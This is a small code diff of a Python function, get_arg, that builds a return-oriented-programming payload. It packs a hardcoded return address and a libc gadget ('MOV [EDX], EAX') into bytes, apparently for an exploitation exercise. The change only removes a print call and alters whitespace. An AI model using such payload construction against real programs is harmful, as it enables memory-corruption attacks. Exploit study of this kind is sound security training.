@@ -34,7 +34,7 @@ def get_arg() -> bytes:
     Returns:
          The bytes of the password argument.
     """  
-    search = GadgetSearch(LIBC_DUMP_PATH)  
+    search = GadgetSearch(LIBC_DUMP_PATH)   
 
     ra = 0x080488b0
 
@@ -45,7 +45,7 @@ def get_arg() -> bytes:
     msg += struct.pack('<i',1)
     msg += struct.pack('<I',search.find('MOV [EDX], EAX'))
     msg += struct.pack('<I',ra)
-    print(msg)
+    
     return msg
 
 
